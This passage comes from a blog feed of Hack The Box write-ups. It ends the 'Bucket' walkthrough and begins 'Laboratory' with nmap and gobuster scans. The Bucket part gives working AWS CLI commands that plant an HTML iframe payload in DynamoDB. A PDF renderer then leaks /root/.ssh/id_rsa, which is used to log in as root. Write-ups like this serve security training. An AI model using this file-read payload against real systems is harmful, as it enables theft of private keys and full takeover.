        &lt;span class=&quot;nb&quot;&gt;date_default_timezone_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'America/New_York'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$client&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DynamoDbClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;
            &lt;span class=&quot;s1&quot;&gt;'profile'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'default'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;s1&quot;&gt;'region'&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'us-east-1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;s1&quot;&gt;'version'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'latest'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;s1&quot;&gt;'endpoint'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'http://localhost:4566'&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;

        &lt;span class=&quot;nv&quot;&gt;$iterator&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;getIterator&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Scan'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
            &lt;span class=&quot;s1&quot;&gt;'TableName'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'alerts'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;s1&quot;&gt;'FilterExpression'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;title = :title&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;s1&quot;&gt;'ExpressionAttributeValues'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;:title&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;S&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Ransomware&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$iterator&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.html'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;nb&quot;&gt;file_put_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'files/'&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;data&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;passthru&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; 800 A4 -out files/result.pdf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once we don’t have a table called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;alerts&lt;/code&gt;, as already enumerated, we’ll need to create it with the attributes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;title&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;data&lt;/code&gt;, which will contain the HTML content to be rendered and later stored in a PDF, possibly allowing us to get some sensitive data from this machine.&lt;/p&gt;

&lt;p&gt;For the initial test, as described in AWS documentation in &lt;a href=&quot;https://docs.aws.amazon.com/cli/latest/userguide/cli-services-dynamodb.html&quot;&gt;this link&lt;/a&gt;, I’ve created a script to create the table, include the Ransomware entry and then make the POST call to generate the PDF.&lt;/p&gt;

&lt;p&gt;To make it easier this process, which is being executed from the attacker machine, executed the following processes:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;From the attacker machine, created an RSA key (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh-keygen&lt;/code&gt;) and associated it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;roy&lt;/code&gt;’s account to prevent asking for password during the process.&lt;/li&gt;
  &lt;li&gt;In the attacker machine was also made a port forwarding using SSH, allowing us to call port 8000 locally and this request would be routed to 8000 to bucket, as below&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh roy@10.10.10.212 &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 8000:127.0.0.1:8000 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/tiTjm7I.png&quot; alt=&quot;Website 8000/TCP via SSH Tunnel&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After some attempts, noticed that, similarly in the beginning while uploading the exploit, the tables and entries created were deleted, preventing us to easily get the content desired. The solution was to chain the commands as made previously processing the request as soon as the resources were available, as well as the file copy later if we had success in the initial call.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aws dynamodb create-table &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--table-name&lt;/span&gt; alerts &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--attribute-definitions&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;AttributeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;title,AttributeType&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S &lt;span class=&quot;nv&quot;&gt;AttributeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;data,AttributeType&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--key-schema&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;AttributeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;title,KeyType&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;HASH &lt;span class=&quot;nv&quot;&gt;AttributeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;data,KeyType&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;RANGE &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--provisioned-throughput&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;ReadCapacityUnits&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10,WriteCapacityUnits&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10 &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt; bucket.htb &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
aws dynamodb put-item &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--table-name&lt;/span&gt; alerts &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--item&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{&quot;title&quot;: {&quot;S&quot;: &quot;Ransomware&quot;},&quot;data&quot;: {&quot;S&quot;: &quot;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Title&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;Head 1&amp;lt;/h1&amp;gt;&amp;lt;p&amp;gt;Content&amp;lt;/p&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&quot;}}'&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--return-consumed-capacity&lt;/span&gt; TOTAL &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt; bucket.htb &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
curl &lt;span class=&quot;nt&quot;&gt;--data&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;action=get_alerts&quot;&lt;/span&gt; http://localhost:8000/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After a few attempts, successfully retrieved the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;result.pdf&lt;/code&gt; file with the content we have passed in the DynamoDB.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;roy@bucket:/var/www/bucket-app/files&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 16
drwxr-x---+ 2 root root 4096 Feb 26 18:51 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-x---+ 4 root root 4096 Feb 10 12:29 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root   88 Feb 26 18:51 7627.html
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root 1870 Feb 26 18:51 result.pdf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/XLxhZ9W.png&quot; alt=&quot;Bucket HTB - PoC&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once we have be able to make the request work, the second step is finding a way to get sensitive data into the PDF file.&lt;/p&gt;

&lt;p&gt;Easiest way would be to import &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/root/root.txt&lt;/code&gt;, but this don’t give us any interactive shell in the box. Just like we did in &lt;a href=&quot;/en-US/writeup/2021/03/htb-passage/&quot;&gt;&lt;strong&gt;Passage&lt;/strong&gt;&lt;/a&gt;, we can look for the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/root/.ssh/id_rsa&lt;/code&gt; and use it to SSH into the machine as root but our issue right now is to find a way to import this file in the static HTML file that will later be rendered into the PDF.&lt;/p&gt;

&lt;p&gt;After some research, the easiest way without using a Javascript to make this possible would be using an &lt;strong&gt;iframe&lt;/strong&gt;, which I’ve added the tag &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;iframe src=&quot;/root/.ssh/id_rsa&quot; seamless&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code&gt; in the HTML content sent earlier:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aws dynamodb create-table &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--table-name&lt;/span&gt; alerts &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--attribute-definitions&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;AttributeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;title,AttributeType&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S &lt;span class=&quot;nv&quot;&gt;AttributeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;data,AttributeType&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--key-schema&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;AttributeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;title,KeyType&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;HASH &lt;span class=&quot;nv&quot;&gt;AttributeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;data,KeyType&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;RANGE &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--provisioned-throughput&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;ReadCapacityUnits&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10,WriteCapacityUnits&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10 &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt; bucket.htb &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
aws dynamodb put-item &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--table-name&lt;/span&gt; alerts &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--item&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{&quot;title&quot;: {&quot;S&quot;: &quot;Ransomware&quot;},&quot;data&quot;: {&quot;S&quot;: &quot;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Title&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;Head 1&amp;lt;/h1&amp;gt;&amp;lt;iframe src=\&quot;/root/.ssh/id_rsa\&quot; seamless&amp;gt;&amp;lt;/iframe&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&quot;}}'&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--return-consumed-capacity&lt;/span&gt; TOTAL &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt; bucket.htb &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
curl &lt;span class=&quot;nt&quot;&gt;--data&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;action=get_alerts&quot;&lt;/span&gt; http://localhost:8000/    
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After running it, was able to download the file at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/bucket-app/files/result.pdf&lt;/code&gt; and, with the contents inside it, created the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt;, which was used to authenticate to SSH to the box as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;, being able to read the root.txt file.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@bucket:~# &lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
root@bucket:~# &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt
&amp;lt;redacted&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I hope you guys have enjoyed this post.&lt;/p&gt;

&lt;p&gt;See you again soon! :smiley:&lt;/p&gt;</content><author><name>Davi Cruz</name></author><category term="Writeup" /><category term="HackTheBox" /><category term="htb-medium" /><category term="htb-linux" /><summary type="html">Hello guys! This week’s machine will be Bucket, another median-rated machine from Hack The Box, created by MrR3boot.</summary></entry><entry><title type="html">Hackthebox write-up: Laboratory</title><link href="https://davicruz.com/writeup/2021/04/htb-laboratory/" rel="alternate" type="text/html" title="Hackthebox write-up: Laboratory" /><published>2021-04-17T13:00:00-03:00</published><updated>2021-04-17T13:00:00-03:00</updated><id>https://davicruz.com/writeup/2021/04/htb-laboratory</id><content type="html" xml:base="https://davicruz.com/writeup/2021/04/htb-laboratory/">&lt;p&gt;Hello everyone!&lt;/p&gt;

&lt;p&gt;The machine of this week wil be &lt;strong&gt;Laboratory&lt;/strong&gt;, another Linux box easy rated from &lt;a href=&quot;https://www.hackthebox.eu&quot;&gt;Hack The Box&lt;/a&gt;, created by &lt;a href=&quot;https://app.hackthebox.eu/users/73268&quot;&gt;0xc45&lt;/a&gt;. &lt;!--more--&gt;&lt;/p&gt;

&lt;p class=&quot;notice--info&quot;&gt;:information_source: &lt;strong&gt;Info&lt;/strong&gt;: Write-ups for Hack the Box are always posted as soon as machines get retired.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/6fqKuas.png&quot; alt=&quot;HTB Laboratory&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;

&lt;p&gt;As usual, we start with published services enumeration using an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; quick scan:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; quick 10.10.10.216                                                                   
Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;will be slower.
Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-02-18 15:50 &lt;span class=&quot;nt&quot;&gt;-03&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.216
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.16s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 997 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp  open  http     Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Did not follow redirect to https://laboratory.htb/
443/tcp open  ssl/http Apache httpd 2.4.41 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
|_http-server-header: Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: The Laboratory
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;laboratory.htb
| Subject Alternative Name: DNS:git.laboratory.htb
| Not valid before: 2020-07-05T10:39:28
|_Not valid after:  2024-03-03T10:39:28
| tls-alpn: 
|_  http/1.1
Service Info: Host: laboratory.htb&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;33.96 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After running it, noticed that besides the SSH service, 2 HTTP services (HTTP and HTTPS) were published in their default ports and the certificate for the HTTPS service mentions 2 DNS entries, which were added to local hosts file to enumerate them properly: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;laboratory.htb&lt;/code&gt; e &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git.laboratory.htb&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;80tcp---http-service&quot;&gt;80/TCP - HTTP Service&lt;/h3&gt;

&lt;p&gt;Accessing this service from IP and any of the DNS entries, noticed that there’s a redirection to HTTPS, which will be discussed in the next section.&lt;/p&gt;

&lt;h3 id=&quot;443tcp---https-service&quot;&gt;443/TCP - HTTPS Service&lt;/h3&gt;

&lt;p&gt;After starting the enumeration, noticed that for each DNS entry published, we have a different service available.&lt;/p&gt;

&lt;h3 id=&quot;httpslaboratoryhtb&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://laboratory.htb&lt;/code&gt;&lt;/h3&gt;

&lt;p&gt;Accessing this webpage, we have an institutional website from a company called Laboratory where Dexter, Dee Dee and Anonymous are the employees, but nothing interesting was found during the validation.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/Fowr3Hn.png&quot; alt=&quot;laboratory htb&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;gobuster&quot;&gt;Gobuster&lt;/h4&gt;

&lt;p&gt;To make sure that anything else is hidden in this website, started scanning using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; dir mode, but anything interesting was found.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; https://laboratory.htb &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; html,php,txt &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
Gobuster v3.0.1
